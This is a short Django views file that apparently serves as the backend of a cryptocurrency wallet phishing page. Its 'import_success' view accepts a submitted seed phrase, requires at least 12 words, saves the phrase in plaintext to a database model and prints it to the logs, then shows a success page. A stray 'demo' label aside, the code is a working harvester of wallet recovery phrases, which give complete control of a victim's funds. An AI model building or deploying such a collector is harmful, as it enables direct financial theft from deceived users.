from django.shortcuts import render
from .models import SeedEntry

def home(request):
    return render(request, 'index.html')

def import_success(request):
    if request.method == 'POST':
        seed = request.POST.get('seed_phrase', '').strip()
        print(f"Received (demo): {seed}")

        words = [w for w in seed.split() if w]
        if len(words) < 12:
            print(f"Rejected: only {len(words)} words")
            return render(request, 'index.html', {'error': f'Phrase must have at least 12 words (you entered {len(words)})'})

        try:
            entry = SeedEntry.objects.create(seed_phrase=seed)
            print(f"SAVED → ID: {entry.id} | Phrase: {seed} | Time: {entry.created_at}")
        except Exception as e:
            print(f"DB SAVE FAILED: {type(e).__name__} - {str(e)}")
            import traceback
            traceback.print_exc()

        return render(request, 'success.html')

    return render(request, 'index.html')
